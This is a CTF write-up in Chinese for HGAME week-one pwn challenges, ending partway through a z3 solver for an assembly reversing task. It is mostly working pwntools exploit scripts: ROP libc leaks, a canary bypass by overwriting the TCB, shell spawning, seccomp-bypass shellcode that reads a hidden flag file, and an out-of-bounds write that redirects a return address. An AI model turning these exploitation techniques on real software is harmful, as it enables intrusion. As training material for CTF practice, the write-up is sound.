# proof of work

爆破四字节hash，利用pwnlib的 mbruteforce 模块：

```python
from pwn import * 
from pwnlib.util.iters 
import mbruteforce 
import itertools 
import base64 
sh = remote("chuj.top", ) 
sh.recvuntil(') == ') 
hash_code = sh.recvuntil('\n', drop=True).decode().strip() 
log.success('hash_code={},'.format(hash_code)) 
charset = string.printable 
proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') 
sh.sendlineafter('????> ', proof) 
sh.interactive()
```

# week1

## PWN -> enter_the_pwn_land (栈溢出，控制循环变量i)
### 描述
    签个到吧
    attachment
    题目地址 nc chuj.top 32094
    hgame{WeLcoME~To-THE~w0RLD~Of_PWn_h0pe~yOU-h4vE-4~GO0D_T1ME}
### 分析
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
只开了NX。

```c
int __fastcall test_thread(void *a1)
{
  char s[40]; // [rsp+0h] [rbp-30h] BYREF
  int v3; // [rsp+28h] [rbp-8h]
  int i; // [rsp+2Ch] [rbp-4h]

  for ( i = 0; i <= 4095; ++i )
  {
    v3 = read(0, &s[i], 1uLL);
    if ( s[i] == 10 )
      break;
  }
  return puts(s);
}
```
这题就是栈溢出，可以覆盖变量i，只要注意一下控制读取的循环变量 i 让溢出继续就行了，后面就是正常的栈溢出。

```python
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('chuj.top', 32765) # nc chuj.top 32765
libc = ELF('./libc-2.31.so')
# io = process('a.out')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./a.out')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
rl = lambda        a=False                : io.recvline(a)
ru = lambda a,b=True        : io.recvuntil(a,b)
rn = lambda x                        : io.recvn(x)
sn = lambda x                        : io.send(x)
sl = lambda x                        : io.sendline(x)
sa = lambda a,b                        : io.sendafter(a,b)
sla = lambda a,b                : io.sendlineafter(a,b)
irt = lambda                        : io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s                        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data                : u32(data.ljust(4, '\x00'))
uu64 = lambda data                : u64(data.ljust(8, '\x00'))
ur64 = lambda data                : u64(data.rjust(8, '\x00'))


# 0x0000000000401313 : pop rdi ; ret
# 404020 puts.plt
# 401260 main
pop_rdi = 0x0000000000401313
puts = elf.got['puts']
pay = 0x2c*"a" #+ p64(pop_rdi) + p64(puts) + p64(0x404020) + p64(0x401260)
pay += p8(0x37) + p64(pop_rdi) + p64(puts) + p64(elf.plt['puts']) + p64(0x401260)
# dbg()
# raw_input()
#sl(pay)
sl(pay)
putsaddr = l64()
lg('putsaddr')

libcbase = putsaddr - libc.sym['puts']
lg('libcbase')
system = libcbase + libc.sym['system']
lg('system')
binsh = libcbase + libc.search('/bin/sh').next()
lg('binsh')
pay = 0x2c*"a" + p8(0x37)+ p64(pop_rdi) + p64(binsh) +p64(0x40101a)+ p64(system)
sl(pay)
irt()
```   

## PWN -> enter_the_evil_pwn_land (栈溢出、TCB结构体，绕过canary)

### 描述
    描述
    他们看起来怎么好像一模一样？
    attachment
    题目地址 nc chuj.top 37268
    hgame{dO_YOu_Know~Tls_@nd~how~$t4cK~bE1NG-cRE@TeD_Now?}
### 分析

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```c
unsigned __int64 __fastcall test_thread(void *a1)
{
  int i; // [rsp+8h] [rbp-38h]
  char s[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 4095; ++i )
  {
    read(0, &s[i], 1uLL);
    if ( s[i] == 10 )
      break;
  }
  puts(s);
  return __readfsqword(0x28u) ^ v4;
}

```
和上面题目逻辑一样，只不过此题加了canary，并且不能覆盖循环变量i来制造栈溢出了。所以首先我们要绕过的就是canary，常规的覆盖\x00泄露的方法不能用了，可以考虑将存储canary的地方的值覆盖，来绕过canary的检查，此题溢出的长度也是足够大的，可以溢出到TCB结构体中的 stack_guard字段。将其覆盖成0就可以bypass canary了，之后就是简单的栈溢出了.

溢出前需要确定canary到TCB结构的stack_guard字段的偏移：

```python
# -*- coding: UTF-8 -*-
from pwn import *

# context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

# io = remote('chuj.top', 36961) #nc chuj.top 36961
# libc = ELF('./libc-2.31.so')
io = process('a.out')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./a.out')

# 0x0000000000401313 : pop rdi ; ret
# 404020 puts.plt
# 401260 main
pop_rdi = 0x0000000000401363
puts = elf.got['puts']
offset = 200
while True:
	try:
		print offset
		offset += 1
		io = process('a.out')
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		pay = 0x28*"a" + p64(0)*2
		pay += p64(pop_rdi) + p64(puts) + p64(elf.plt['puts']) + p64(0x4011D6) + p64(0)*offset
		# dbg()
		# raw_input()
		#sl(pay)
		sl(pay)
		putsaddr = l64()
		lg('putsaddr')
	except:
		pass

```
观察程序在哪个偏移没有抛出异常，就是正确的覆盖了canary，记录偏移，此题偏移为259。
**注意**
不能用system的方式获取shell，在lipthread里为了安全这些库函数都加了wrapper，导致leak地址不对。可以考虑系统调用execve，或者ongadget，libc-2.31下onegadget要保证一些特定寄存器为NULL，可以通过rop来设置寄存器使得onegadget生效。
### exp
```python
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('chuj.top', 36961) #nc chuj.top 36961
libc = ELF('./libc-2.31.so')
# io = process('a.out')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./a.out')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


# 0x0000000000401363 : pop rdi ; ret
# 0x0000000000401361 : pop rsi ; pop r15 ; ret
# 404020 puts.plt
# 401260 main
# bss 0x404060
# bss 0x404060
# 0x000000000011c341 : pop rdx ; pop r12 ; ret
# 0x000000000011c371 : pop rdx ; pop r12 ; ret    remote
# 0x0000000000026b71 : pop r15 ; ret
# 0x0000000000032b59 : pop r12 ; ret
offset = 259
pop_rdi = 0x0000000000401363
pop_rsi_r15 = 0x0000000000401361
pop_r12 = 0x0000000000032b59
bss = 0x404060
leaveret = 0x40125A
puts = elf.got['puts']
readplt = elf.plt['read']
pay = 0x28*"a" + p64(0)*2
pay += p64(pop_rdi) + p64(puts) + p64(elf.plt['puts']) + p64(0x4011D6) + p64(0)*offset

# dbg()
# raw_input()
#sl(pay)
sl(pay)
putsaddr = l64()
lg('putsaddr')

libcbase = putsaddr - libc.sym['puts']
lg('libcbase')
system = libcbase + libc.sym['system']
lg('system')
binsh = libcbase + libc.search('/bin/sh').next()
lg('binsh')
one = 0xe6c7e + libcbase# 0xe6c7e  0xe6c81  0xe6c84  0xe6c4e 0xe6c51 0xe6c54
pay = 0x28*"a" + p64(0)*2
# pay = p64(0xdeadbeef) + p64(pop_rdi) + p64(binsh) + p64(0x40101a) + p64(system)
pay += p64(pop_r12+libcbase) + p64(0)+p64(one)
sl(pay)
irt()

```
## PWN -> oldfashion_orw
### 描述
    描述
    hint0: 这道题目的 flag 可不叫 flag 哦~
    拿个 shell 看看叫啥?（真的拿得到吗）
    attachment
    题目地址 nc chuj.top 42614
### 分析
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
附件start.sh
```bash

rm /home/ctf/flag*
cp /flag "/home/ctf/flag`head /dev/urandom |cksum |md5sum |cut -c 1-20`"
cd /home/ctf
exec 2>/dev/null
/usr/sbin/chroot --userspec=1000:1000 /home/ctf timeout 300 ./vuln
```
发现flag文件格式以及flag文件位置。

只开了NX，发现有沙箱：
```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x09 0x00 0x40000000  if (A >= 0x40000000) goto 0013
 0004: 0x15 0x08 0x00 0x0000003b  if (A == execve) goto 0013
 0005: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0013
 0006: 0x15 0x06 0x00 0x00000101  if (A == openat) goto 0013
 0007: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0013
 0008: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0013
 0009: 0x15 0x03 0x00 0x00000086  if (A == uselib) goto 0013
 0010: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0013
 0011: 0x15 0x01 0x00 0x0000003a  if (A == vfork) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
➜  to_give_out 
```
仅用了execve、openat等函数，open库函数不能用，但是系统调用open可以，所以可以使用汇编写shellcode来orw读取flag了。提示flag文件不叫flag，还得获取当前目录来获取flag文件名。
```c

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char buf[40]; // [rsp+0h] [rbp-30h] BYREF
  size_t nbytes; // [rsp+28h] [rbp-8h]

  init_io(argc, argv, envp);
  disable_syscall();
  write(1, "size?\n", 6uLL);
  read(0, buf, 0x10uLL);
  nbytes = atoi(buf);
  if ( (__int64)nbytes <= 32 )
  {
    write(1, "content?\n", 9uLL);
    read(0, buf, (unsigned int)nbytes); <-------overflow>
    write(1, "done!\n", 6uLL);
    result = 0;
  }
  else
  {
    write(1, "you must be kidding\n", 0x14uLL);
    result = -1;
  }
  return result;
}
```
漏洞点为栈溢出，可以用nbytes = -1111111来绕过判断，bss端开头有stdout地址，可以rop将bss段内容泄露出来，获取libc。之后可以rop先获取flag文件名（这里推荐用系统调用，比较简洁清晰），然后orw读取flag。
这里如何取打开当前目录获取文件夹下的文件名呢？可以使用[fdopendir](https://pubs.opengroup.org/onlinepubs/9699919799/functions/opendir.html)函数会返回一个句柄，然后readdir(fd)读取目录文件，返回时一个地址，里面存储文件名。示例如下：
```c
#include <stdio.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

int
main(int argc, char *argv[])
{
    struct stat statbuf;
    DIR *d;
    struct dirent *dp;
    int dfd, ffd;
    char buf[80];

    if ((d = fdopendir((dfd = open("./", O_RDONLY)))) == NULL) {
        fprintf(stderr, "Cannot open ./tmp directory\n");
        exit(1);
    }
    while ((dp = readdir(d)) != NULL) {
        printf("%s/%s",argv[1],dp->d_name);
        
    }
    closedir(d); // note this implicitly closes dfd
    return 0;
}

```
目录也是文件，也可以用open打开。

**思路**
可以往bss段写shellcode实现获取flag文件名然后orw读取flag文件，首先要给bss赋予执行权限，之后rop将shellcode写入bss，rop程序返回bss段。
注意的是，bss要预留足够大的空间让库函数运行，本次用的是bss+0x700。

有意思的是shellcode怎么写，经过大佬指点，原来shellcode还可以这么写,pwntools可以实时编译shellcode，也支持汇编的标签。
1. fd = open('./')
2. fd = fdopendir(fd)
3. dp = readdir(fd)
4. 在内存中搜索flag文件名
5. open
6. read
7. write

shellcode如下：
```asm
shellcode = asm('''
/*open('./')*/
mov rax,0x2f2e
push rax
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,2
syscall
/*fdopendir*/
mov rdi,rax
mov rax,%d
call rax
/*readdir*/
mov rdi,rax
mov rax,%d
call rax
/*search flag*/
mov rdi,0x1
loop:
inc rdi
cmp dword ptr[rax+rdi],0x67616c66
jnz loop

/*open('flagxxxxxxxxxxxxxxxxxxxxxxx')*/
lea rdi,[rax+rdi]
mov rsi,0
mov rdx,0
mov rax,2
syscall

/*read()*/
mov rdi,rax
mov rsi,rsp
mov rdx,1024
mov rax,0
syscall
/*write()*/
mov rdi,1
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall
/*exit*/
mov rdi,0
mov rax,60
syscall

''' % (fdopendir,readdir))
```
关键在于在内存中搜索flag的操作，省去了很多繁琐的rop操作，不用泄露出来再读进去了，简化了利用方式。
pwntools默认架构不是amd64，需要设置`context(arch='amd64',os='linux')`
### exp
```python
# -*- coding: UTF-8 -*-
from fcntl import FASYNC
from elftools.construct.macros import Flag
from pwn import *
from pwnlib import flag

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = True
debug = True
if local:
    io = process('vuln')
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF('./libc-2.31.so')
else:
    io = remote('chuj.top', 44237) #nc chuj.top 44237
    libc = ELF('./libc-2.31.so')
elf = ELF('vuln')
context(arch='amd64',os='linux')
l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

# 0x0000000000401443 : pop rdi ; ret
# 0x0000000000401441 : pop rsi ; pop r15 ; ret
# 404020 puts.plt
# 0x401311 main
shellcode1 = '''mov rax,0x67616c662f2e
push rax
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,2
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,1024
mov rax,0
syscall
mov rdi,1
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall
mov rdi,0
mov rax,60
syscall

'''
pop_rdi = 0x0000000000401443
pop_rsi_r15 = 0x0000000000401441
if False :
    # local rop of libc
    pop_rsi = 0x00000000000274f9  
    pop_rdx_r12 = 0x000000000011c341 
    #0x00000000000ab83b : mov qword ptr [rdi], rax ; mov rax, r9 ; ret
    move_rdi_rax = 0x00000000000ab83b
    #0x0000000000162938 : mov rdi, qword ptr [rdi] ; call qword ptr [rax + 0x1e8]
    move_rdi_call_rax = 0x0000000000162938
    #0x0000000000027096 : mov rsi, qword ptr [rax] ; xor eax, eax ; call qword ptr [rdx + 0x1d0]
    move_rsi_call_rdx = 0x0000000000027096
    pop_rbx = 0x000000000331cf
    pop_rax = 0x000000000004a520 # local
else:
    # remote rop of libc  cmd:ROPgadget --binary ./libc-2.31.so  --depth 20 > 2.txt
    pop_rsi = 0x0000000000027529 # remote  0x0000000000027529 local 0x00000000000274f9 
    pop_rdx_r12 = 0x000000000011c371 # remote  0x000000000011c371 local 0x000000000011c341
    #0x00000000000ab85b : mov qword ptr [rdi], rax ; mov rax, r9 ; ret
    move_rdi_rax = 0x00000000000ab85b
    #0x0000000000162858 : mov rdi, qword ptr [rdi] ; call qword ptr [rax + 0x1e8]
    move_rdi_call_rax = 0x0000000000162858
    #0x00000000000270c6 : mov rsi, qword ptr [rax] ; xor eax, eax ; call qword ptr [rdx + 0x1d0]
    move_rsi_call_rdx = 0x00000000000270c6
    pop_rbx = 0x00000000000331ff
    pop_rax = 0x000000000004a550 # local
 

bss = 0x404060
if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)
sla("size?\n",str(-1111111))
pay = 0x28*'a'+'a'*0x10+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(bss)+p64(0)+p64(elf.plt['write'])+p64(0x401311)
sa('content?\n',pay)
libcbase = l64()-libc.sym['_IO_2_1_stdout_']
lg('libcbase')

mprotect_addr = libcbase + libc.sym['mprotect']#+ 0x11bad0 #
readdir = libcbase + libc.sym['readdir']
lg('readdir')
fdopendir = libcbase + libc.sym['fdopendir']
lg('fdopendir')

rdx = 4 | 2 | 1
if debug == True:
    dbg()
    raw_input()
sla("size?\n",str(-1111111))
pay = 0x28*'a'+'a'*0x8 + p64(bss+0x700+0x53) 
pay += p64(pop_rdi)+p64(bss-0x60) 
pay += p64(pop_rsi+libcbase)+p64(0x20000) 
pay += p64(pop_rdx_r12+libcbase)+p64(rdx)+p64(0) 
pay += p64(mprotect_addr) 
pay += p64(pop_rdi)+p64(0) 
pay += p64(pop_rsi+libcbase)+p64(bss+0x700) 
pay += p64(pop_rdx_r12+libcbase)+p64(0x300)+p64(0) 
pay += p64(elf.plt['read']) 

pay += p64(bss+0x700)
pay += p64(bss+0x700)

sa('content?\n',pay)

# ban openat,so funtion open of libc can't use
libc_read = libcbase + libc.sym['read'] 
libc_write = libcbase + libc.sym['write'] 
# shellcodeorw = asm()
shellcode = asm('''
/*open('./')*/
mov rax,0x2f2e
push rax
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,2
syscall
/*fdopendir*/
mov rdi,rax
mov rax,%d
call rax
/*readdir*/
mov rdi,rax
mov rax,%d
call rax
/*search flag*/
mov rdi,0x1
loop:
inc rdi
cmp dword ptr[rax+rdi],0x67616c66
jnz loop

/*open('flagxxxxxxxxxxxxxxxxxxxxxxx')*/
lea rdi,[rax+rdi]
mov rsi,0
mov rdx,0
mov rax,2
syscall

/*read()*/
mov rdi,rax
mov rsi,rsp
mov rdx,1024
mov rax,0
syscall
/*write()*/
mov rdi,1
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall
/*exit*/
mov rdi,0
mov rax,60
syscall

''' % (fdopendir,readdir))

ru('done!\n')
sl(shellcode) 
irt()

```
## PWN -> test_your_nc
直接链接，nc即可。
## PWN -> test_your_gdb (栈溢出、多线程调试)
除PIE之外，其他保护都开了，先经过调试获取passwd，然后进入栈溢出，recv拿到canary，直接溢出返回到backdoor
### exp
```python
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]

io = remote('chuj.top', 50610) #nc chuj.top 34698
# libc = ELF('./libc-2.31.so')
# io = process('a.out')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

	
# backdoor = 0x401256
#0xb0361e0e8294f147	0x8c09e0c34ed8a6a9
# dbg()
# pause()
sa('pass word\n',p64(0xb0361e0e8294f147)+p64(0x8c09e0c34ed8a6a9))
# irt()
rev = rn(0x100)
canary = uu64(rev[0x18:0x20])
lg('canary')
rbp = uu64(rev[0x20:0x28])
lg('rbp')
backdoor = 0x401256
pay = 0x18*'a' + p64(canary) + p64(rbp) + p64(backdoor)
sn(pay)
irt()



```
## PWN -> ser_per_fa (spfa算法、图论、下标越界)
### 描述
    描述
    我宣布 spfa 是世界上最好的单源最短路算法
    attachment
    题目地址 
    nc chuj.top 47418
### 分析
spfa单源最短路径算法，题目给了源码：
```c
// g++ spfa.cc -o spfa
#include <stdio.h>
#include <stdlib.h>
#include <queue>
#include <string.h>

#define NODES 210
#define EDGES 610

struct EDGE
{
    long long nxt, to, dis;
} edge[EDGES];

long long n, m, w, a, b, num_edge, t;
long long head[NODES], vis[NODES], dist[NODES], cnt[NODES];

void _add(long long from, long long to, long long dis)
{
    edge[++num_edge].to = to;
    edge[num_edge].dis = dis;
    edge[num_edge].nxt = head[from];
    head[from] = num_edge;
}

void spfa(long long s)
{
    std::queue<int> q;
    q.push(s);
    dist[s] = 0;
    vis[s] = 1;
    while (!q.empty())
    {
        long long u = q.front();
        q.pop();
        vis[u] = 0;
        for (long long i = head[u]; i; i = edge[i].nxt)
        {
            long long v = edge[i].to;
            if (dist[v] > dist[u] + edge[i].dis)
            {
                dist[v] = dist[u] + edge[i].dis; //<--- write
                if (vis[v] == 0)
                {
                    vis[v] = 1;
                    q.push(v);
                }
            }
        }
    }
}

void backd00r()
{
    system("/bin/sh");
}

void init_io()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

int main()
{
    long long t;

    init_io();

    printf("how many datas?\n>> ");
    scanf("%lld", &t);
    while (t--)
    {
        memset(vis, 0, sizeof(vis));
        memset(dist, 0, sizeof(dist));
        memset(cnt, 0, sizeof(cnt));
        memset(head, 0, sizeof(head));
        memset(dist, 127 / 3, sizeof(dist));
        printf("how many nodes?\n>> ");
        scanf("%lld", &n);
        printf("how many edges?\n>> ");
        scanf("%lld", &m);
        printf("input edges in the\n[from] [to] [distant]\nformat\n");
        for (long long i = 0; i < m; i++)
        {
            scanf("%lld%lld%lld", &a, &b, &w);
            _add(a, b, w);
        }

        printf("you want to start from which node?\n>> ");
        long long x;
        scanf("%lld", &x);

        spfa(x);

        printf("calc done!\nwhich path you are interested %lld to ?\n>> ", x);
        scanf("%lld", &x);
        printf("the length of the shortest path is %lld\n", dist[x]);   //<--leak
    }
    return 0;
}

```
存在backdoor，由于dist的idx范围没有限制，可以泄露libc和processbase，然后通过spfa算法将main的返回地址写成backdoor的地址（此写操作可通过spfa算法将distance的值写入dist[v]来实现修改）
### exp
```python
# coding=utf-8 
from pwn import * 
context.log_level = "debug" 
context.terminal = ["tmux", "splitw", "-h"] 
local = False
# local = True

sh = remote('chuj.top', 47418) # nc chuj.top 47418
libc = ELF('./libc-2.31.so')
# sh = process("./spfa") 
elf = ELF("./spfa")
# libc = ELF("./libc-2.31.so") 

l64 = lambda      :u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(sh.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: sh.recvline(a)
ru = lambda a,b=True	: sh.recvuntil(a,b)
rn = lambda x			: sh.recvn(x)
sn = lambda x			: sh.send(x)
sl = lambda x			: sh.sendline(x)
sa = lambda a,b			: sh.sendafter(a,b)
sla = lambda a,b		: sh.sendlineafter(a,b)
irt = lambda			: sh.interactive()
dbg = lambda text=None  : gdb.attach(sh, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)

sh.sendlineafter("datas?\n>> ", '4') 
# get libc base 
sh.sendlineafter("nodes?\n>> ", str(1)) 
sh.sendlineafter("edges?\n>> ", str(0)) 
sh.sendlineafter("node?\n>> ", str(0)) 
sh.sendlineafter("to ?\n>> ", str(-((elf.sym["dist"] - elf.got["puts"]) / 8))) 
sh.recvuntil("path is ") 
libc_base = int(sh.recvuntil("\n", drop = True), base = 10) - libc.sym["puts"] 
log.success("libc_base: " + hex(libc_base)) 
# get process base 
sh.sendlineafter("nodes?\n>> ", str(1)) 
sh.sendlineafter("edges?\n>> ", str(0)) 
sh.sendlineafter("node?\n>> ", str(0)) 
sh.sendlineafter("to ?\n>> ", str(-2367)) 
sh.recvuntil("path is ") 
proc_base = int(sh.recvuntil("\n", drop = True), base = 10) - 0x12E0 
log.success("proc_base: " + hex(proc_base)) 
# get environ (stack addr) 
# # environ 所在的地址与栈帧中存储 main 函数返回地址的位置的偏移是 0x100 
sh.sendlineafter("nodes?\n>> ", str(1)) 
sh.sendlineafter("edges?\n>> ", str(0)) 
sh.sendlineafter("node?\n>> ", str(0)) 
sh.sendlineafter("to ?\n>> ", str((libc_base + 0x1EF2E0 - proc_base - elf.sym["dist"]) / 8)) 
sh.recvuntil("path is ") 
environ_addr = int(sh.recvuntil("\n", drop = True), base = 10) 
log.success("environ_addr: " + hex(environ_addr)) 
index_to_ret = (environ_addr - 0x100 - (proc_base + elf.sym["dist"])) / 8 
sh.sendlineafter("nodes?\n>> ", str(2)) 
sh.sendlineafter("edges?\n>> ", str(1)) 
sh.sendlineafter("format\n", "0 " + str(index_to_ret) + " " + str(proc_base + 0x16AA)) 
sh.sendlineafter("node?\n>> ", str(0)) 
sh.sendlineafter("to ?\n>> ", str(0)) 
sh.interactive()
```
## RE -> easyasm
此题是个16位汇编语言的题，ida识别为dos下程序，通过看汇编可以分析出程序逻辑
### 分析
```asm
seg003:000D loc_100DD:                              ; CODE XREF: start+38↓j
seg003:000D                 cmp     si, 1Ch
seg003:0010                 jz      short loc_10135
seg003:0012                 xor     ax, ax
seg003:0014                 mov     al, [si]
seg003:0016                 shl     al, 1
seg003:0018                 shl     al, 1
seg003:001A                 shl     al, 1
seg003:001C                 shl     al, 1
seg003:001E                 push    ax
seg003:001F                 xor     ax, ax
seg003:0021                 mov     al, [si]
seg003:0023                 shr     al, 1
seg003:0025                 shr     al, 1
seg003:0027                 shr     al, 1
seg003:0029                 shr     al, 1
seg003:002B                 pop     bx
seg003:002C                 add     ax, bx
seg003:002E                 xor     ax, 17h
seg003:0031                 add     si, 1
seg003:0034                 cmp     al, es:[si-1]
seg003:0038                 jz      short loc_100DD
seg003:003A                 mov     ax, 0B800h
seg003:003D                 mov     es, ax
seg003:003F                 assume es:nothing
seg003:003F                 mov     byte ptr es:0, 77h ; 'w'
seg003:0045                 mov     byte ptr es:2, 72h ; 'r'
seg003:004B                 mov     byte ptr es:4, 6Fh ; 'o'
seg003:0051                 mov     byte ptr es:6, 6Eh ; 'n'
seg003:0057                 mov     byte ptr es:8, 67h ; 'g'
seg003:005D                 mov     byte ptr es:0Ah, 21h ; '!'
seg003:0063
seg003:0063 loc_10133:                              ; CODE XREF: start:loc_10133↓j
seg003:0063                 jmp     short loc_10133
seg003:0065 ; ---------------------------------------------------------------------------
seg003:0065
seg003:0065 loc_10135:                              ; CODE XREF: start+10↑j
seg003:0065                 mov     ax, 0B800h
seg003:0068                 mov     es, ax
seg003:006A                 mov     byte ptr es:0, 72h ; 'r'
seg003:0070                 mov     byte ptr es:2, 69h ; 'i'
seg003:0076                 mov     byte ptr es:4, 67h ; 'g'
seg003:007C                 mov     byte ptr es:6, 68h ; 'h'
seg003:0082                 mov     byte ptr es:8, 74h ; 't'
seg003:0088                 mov     byte ptr es:0Ah, 21h ; '!'
```
### exp
```python
from z3 import *
seg001 = [  0x91, 0x61, 0x01, 0xC1, 0x41, 0xA0, 0x60, 0x41, 0xD1, 0x21, 
  0x14, 0xC1, 0x41, 0xE2, 0x50, 0xE1, 0xE2, 0x54, 0x20, 0xC1, 
  0xE2, 0x60, 0x14, 0x30, 0xD1, 0x51, 0xC0, 0x17]
print(len(seg001))
def Z3():
    s = Solver()
    flag = [BitVec(('x%d' % i), 8) for i in range(0x1c)]
    
    for i in range(0x1c):
        flag[i]=(((((flag[i]<<4)&0xffff) + ((flag[i]>>4)&0xffff))&0xffff)^0x17)&0xff
       
    for i in range(0x1c):
        s.add(flag[i] == seg001[i])
  
